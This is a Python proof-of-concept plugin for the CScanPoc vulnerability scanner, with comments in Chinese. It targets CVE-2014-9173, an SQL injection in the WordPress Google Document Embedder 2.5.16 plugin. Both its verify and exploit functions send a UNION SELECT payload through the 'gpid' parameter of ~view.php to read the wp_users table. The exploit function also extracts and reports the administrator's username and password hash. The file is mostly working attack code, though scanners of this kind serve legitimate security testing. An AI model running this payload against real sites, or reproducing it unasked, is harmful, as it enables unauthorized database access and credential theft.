# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'WordPress_0018'  # 平台漏洞编号，留空
    name = 'WordPress Google Document Embedder 2.5.16 ~view.php SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-03'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        漏洞文件：~view.php
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/35447/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2014-9173'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Google Document Embedder 2.5.16'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f19792de-078d-4535-b0e9-a77ff00135f0'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/wp-content/plugins/google-document-embedder/~view.php'
            url = '{target}'.format(target=self.target)+payload
            params = {
                'embedded': 1,
                'gpid': ('0 UNION SELECT 1,2,3,CONCAT(CAST(CHAR(97,58,49,58,123,11'
                         '5,58,54,58,34,118,119,95,99,115,115,34,59,115,58)as CHAR),LEN'
                         'GTH(md5(1234)),CAST(CHAR(58,34)as CHAR),md5(26443),CAST(CHAR('
                         '34,59,125)as CHAR))FROM wp_users WHERE ID=1')
            }

            response = requests.get(url, params=params).text
            match = re.search(
                r'type="text/css" href="(?P<Username>.*):(?P<Password>.*)">', response)

            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            payload = '/wp-content/plugins/google-document-embedder/~view.php'
            url = '{target}'.format(target=self.target)+payload
            params = {
                'embedded': 1,
                'gpid': ('0 UNION SELECT 1,2,3,CONCAT(CAST(CHAR(97,58,49,58,123,11'
                         '5,58,54,58,34,118,119,95,99,115,115,34,59,115,58)as CHAR),LEN'
                         'GTH(md5(1234)),CAST(CHAR(58,34)as CHAR),md5(26443),CAST(CHAR('
                         '34,59,125)as CHAR))FROM wp_users WHERE ID=1')
            }

            response = requests.get(url, params=params).text
            match = re.search(
                r'type="text/css" href="(?P<Username>.*):(?P<Password>.*)">', response)

            if match:
                username = match.groupdict()['Username']
                password = match.groupdict()['Password']
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
